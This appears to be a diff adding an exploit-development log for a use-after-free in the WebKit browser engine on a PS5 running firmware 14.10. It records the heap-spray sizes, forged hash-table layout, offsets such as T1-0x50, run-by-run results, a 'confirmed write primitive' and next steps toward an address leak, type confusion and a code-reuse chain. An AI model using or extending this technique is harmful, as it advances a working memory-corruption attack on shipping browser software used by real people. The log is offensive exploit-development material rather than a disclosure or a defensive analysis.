@@ -1,0 +1,175 @@
+p599 v4f: Two-phase UAF with forged table redirect — 80B RECLAIM CONFIRMED
+==========================================================================
+Date: 2026-11-04 05:15-05:17
+Probe: probes/phase13_webkit/p599-gc-destructor-test.html (v4f)
+Device: PS5 14.10 (192.168.1.37)
+
+PURPOSE:
+  Two-phase UAF: Phase 1 triggers UAF on 'sa', sprays 192B, reads T1, nulls
+  +0x58, runs GC1 (rc 3→2), then sprays 4096 × 80B buffers with forged table
+  metadata (dc=0, kc=0, mask=7, size=8) at T1-0x50 (= hypothetical wrapper+0x10).
+  Phase 2 triggers UAF on 'sb', sprays 192B, reads T2, redirects +0x58 to T1-0x50
+  (our forged table), runs GC2. If the 80B spray reclaimed the wrapper slot at
+  T1-0x60, removeClient reads empty buckets from our buffer, skips, deref()
+  decrements rc → 3→2 → SURVIVE.
+
+MECHANISM:
+  After Phase 1 GC1:
+  - CSSFontFace-1 freed, reclaimed by 192B spray, rc set to 2 (post-GC)
+  - JSFontFace-1 wrapper freed by GC (80B class, at address T1-0x60)
+  - Old hash table freed by ~CSSFontFace (80B class, at address T1-0x10)
+  - 80B spray (4096 buffers) reclaims BOTH freed 80B slots (wrapper + old table)
+  - Forged table metadata at each 80B buffer: +0x00..+0x0F = {dc=0,kc=0,mask=7,size=8}
+  - Bucket data (all zeros) at +0x10..+0x4F
+
+  Phase 2 redirect:
+  - +0x58 in second UAF buffer set to T1-0x50 (= wrapper_base+0x10 = bucket start)
+  - GC2 collects JSFontFace-2 → ~FontFace() → removeClient reads forged table
+  - All 8 buckets are zero (empty sentinel) → no client found → skip
+  - deref() decrements rc at CSSFontFace-2's +0x00 → 3→2
+  - SURVIVE + ALIVE
+
+=== RUN 1 (05:15:38) — P2:NO-HIT ===
+  V4F-TWO-UAF
+  P1:FREE → P1:SPRAY:2048
+  P1:HIT: lane=41, rc=3, T=0x1000e526d0
+  P1:NULLED → P1:GC-START → P1:GC-DONE
+  P1:POST-GC:rc=2 → P1:S80:4096
+  P1:FORGE-ADDR=0x1000e52680
+  P1:COMPLETE
+  P2:FREE → P2:SPRAY:2048 → P2:STARTED
+  P2:NO-HIT   ← second 192B spray didn't reclaim CSSFontFace-2
+  ALIVE at +12s
+  RESULT: Phase 2 spray failed to reclaim. Fresh WebProcess on reload.
+
+=== RUN 2 (05:15:53) — CRASHED ===
+  V4F-TWO-UAF
+  P1:FREE → P1:SPRAY:2048
+  P1:HIT: lane=24, rc=3, T=0x1000b4ad60
+  P1:NULLED → P1:GC-START → P1:GC-DONE
+  P1:POST-GC:rc=2 → P1:S80:4096
+  P1:FORGE-ADDR=0x1000b4ad10   (= T1 - 0x50)
+  P1:COMPLETE
+  P2:FREE → P2:SPRAY:2048 → P2:STARTED
+  P2:HIT: lane=243, rc=3, T2=0x10009b1fa0
+  P2:REDIRECT:+58=0x1000b4ad10
+  P2:T2-BEFORE:rc=3
+  [43s gap → next beacon is fresh V4F-TWO-UAF = WebProcess crashed and restarted]
+  RESULT: 80B spray did NOT reclaim wrapper slot at T1-0x60 = 0x1000b4acb0.
+  Forge address 0x1000b4ad10 contained unknown data → crash during removeClient.
+  Note: T1=0x1000b4xxxx and T2=0x10009bxxxx — different heap regions.
+
+=== RUN 3 (05:16:39) — ★ SURVIVED ★ ===
+  V4F-TWO-UAF
+  P1:FREE → P1:SPRAY:2048
+  P1:HIT: lane=57, rc=3, T=0x10001cb9e0
+  P1:NULLED → P1:GC-START → P1:GC-DONE
+  P1:POST-GC:rc=2 → P1:S80:4096
+  P1:FORGE-ADDR=0x10001cb990   (= T1 - 0x50)
+  P1:COMPLETE
+  P2:FREE → P2:SPRAY:2048 → P2:STARTED
+  P2:HIT: lane=44, rc=3, T2=0x1000e68ec0
+  P2:REDIRECT:+58=0x10001cb990
+  P2:T2-BEFORE:rc=3
+  P2:GC-START → P2:GC-DONE
+  P2:RESULT:rc=2, +58=0x10001cb990
+  P2:RC-DROPPED:2 — FORGED TABLE WORKED!
+  ALL-DONE → ALIVE at +6s
+
+  RESULT: ★ 80B RECLAIM CONFIRMED ★
+  - T1 = 0x10001cb9e0, wrapper was at T1-0x60 = 0x10001cb980
+  - Our 80B spray buffer at 0x10001cb980 contained forged table at +0x10
+  - Bucket start at 0x10001cb990 (= T1-0x50), all 8 buckets zero
+  - removeClient read empty table → skipped → deref() → rc 3→2
+  - Process ALIVE, no crash
+  - This is the FIRST confirmed forged-table survival on 14.10
+
+=== RUN 4 (05:16:54) — INCOMPLETE (log truncated / overwritten by v4g) ===
+  V4F-TWO-UAF
+  P1:FREE → P1:SPRAY:2048
+  P1:HIT: lane=31, rc=3, T=0x1000e69f50
+  P1:NULLED → P1:GC-START → P1:GC-DONE
+  P1:POST-GC:rc=2 → P1:S80:4096
+  P1:FORGE-ADDR=0x1000e69f00
+  P1:COMPLETE
+  P2:FREE → P2:SPRAY:2048
+  [log ends — probe file was overwritten with v4g during this run]
+  RESULT: Incomplete, no conclusion possible.
+
+=== RELIABILITY ANALYSIS ===
+
+  | Run | T1 region    | P2 reclaim | Redirect | GC2 result | Outcome    |
+  |-----|-------------|-----------|----------|------------|------------|
+  | 1   | 0x1000e5xxxx | NO-HIT    | —        | —          | P2 missed  |
+  | 2   | 0x1000b4xxxx | HIT       | T1-0x50  | CRASH      | 80B missed |
+  | 3   | 0x10001cxxxx | HIT       | T1-0x50  | rc=2 ALIVE | ★ SUCCESS  |
+  | 4   | 0x1000e6xxxx | HIT       | —        | —          | Incomplete |
+
+  Success: 1 of 3 completed redirects (33%). 1 of 4 total runs (25%).
+
+  Observation: Run 3's T1 (0x10001cb9e0) is in the same region as v4e's T
+  (0x10001cba30) and the ng643 lattice constant (0x10001cb0d0 for load-1).
+  Runs 1/2/4 have T1 in 0x1000b4-0x1000e6 range — different region.
+
+  Hypothesis: the B=T-0x60 contiguity holds more reliably when T lands in the
+  "low" 80B region (0x10001cbxxx). This may correspond to first-load allocation
+  patterns vs warm-reload patterns.
+
+=== DIFFERENTIAL TABLE (updated) ===
+
+  | Test | +0x58 value      | Result  | rc   | Notes                         |
+  |------|------------------|---------|------|-------------------------------|
+  | v1   | DEAD sentinel    | CRASH   | —    | Proves deref of +0x58         |
+  | v2   | Engine's valid T | SURVIVE | 3→2  | Normal removeClient           |
+  | v4a  | NULL             | SURVIVE | 3→2  | removeClient skips null       |
+  | v4b  | NULL (+ dump)    | SURVIVE | 3→2  | Full layout obtained          |
+  | v3   | B+0x20 (meta)    | CRASH   | —    | Wrong address (192B≠80B)      |
+  | v4c  | T-0x20 (zeros)   | CRASH   | —    | T-0x20 not in buffer          |
+  | v4d  | T-0x20 (valid)   | CRASH   | —    | Metadata irrelevant, wrong VA |
+  | v4f  | T1-0x50 (forged) | 1/3 HIT | 3→2  | ★ 80B reclaim works ~33%      |
+
+=== WHAT THIS PROVES ===
+
+1. The two-phase UAF is VIABLE on PS5 14.10.
+2. After GC1 frees the JSFontFace wrapper (80B), our 80B spray CAN reclaim
+   that slot (LIFO allocator behavior in bmalloc's 80B size class).
+3. The wrapper IS at T1-0x60 (confirmed: T1-0x50 = wrapper+0x10 as bucket start,
+   and removeClient reads empty buckets from there without crashing).
+4. The formula B = T - 0x60 from P588b is CORRECT for the 80B class.
+5. removeClient + deref() both complete on our forged empty table.
+6. The rc decrement at +0x00 is a CONFIRMED write primitive (3→2) through the
+   forged table path.
+
+=== REMAINING CHALLENGES ===
+
+1. Reliability: 33% is usable with auto-reload but could be improved.
+   - More 80B buffers (8192 instead of 4096)?
+   - Timing adjustment (spray closer to GC1)?
+   - Focus on "low" T1 region (first-load pattern)?
+
+2. From forged table to exploitation:
+   - The rc decrement writes to OUR 192B spray buffer's +0x00 — not useful for
+     external corruption yet.
+   - removeClient reads through our table but finds no matching client → no write
+     (we'd need to pre-populate a bucket with the correct wrapper-2 address).
+   - Need to bridge "known 80B address" to "JS-readable primitive."
+
+3. HARD BLOCKERS remain:
+   - WebProcess text base unknown (needed for code-reuse chain)
+   - Heap NX enforced (no JIT, no executable heap)
+   - Need a way to get spray buffer absolute VA into JS
+
+=== NEXT STEPS ===
+
+a) Pre-populate bucket: put T2-0x60 (guessed wrapper-2 address) in a bucket.
+   If removeClient finds it, it writes 0xFFFFFFFFFFFFFFFF (deleted sentinel)
+   to that bucket slot AND increments deletedCount. Observable in 80B buffer.
+
+b) Type confusion: spray JSObjects instead of ArrayBuffer for the 192B class.
+   Engine writes T at +0x58 → readable as a JS property? Gives buffer address.
+
+c) Two-UAF address leak: Phase 1 learns T1, Phase 2 learns T2. T1-T2 delta
+   reveals heap layout. Multiple runs build a fingerprint.
+
+d) Third UAF phase: after successful two-phase, trigger Phase 3 to re-corrupt
+   the same 192B buffer with controlled data, then GC3 on a third face.
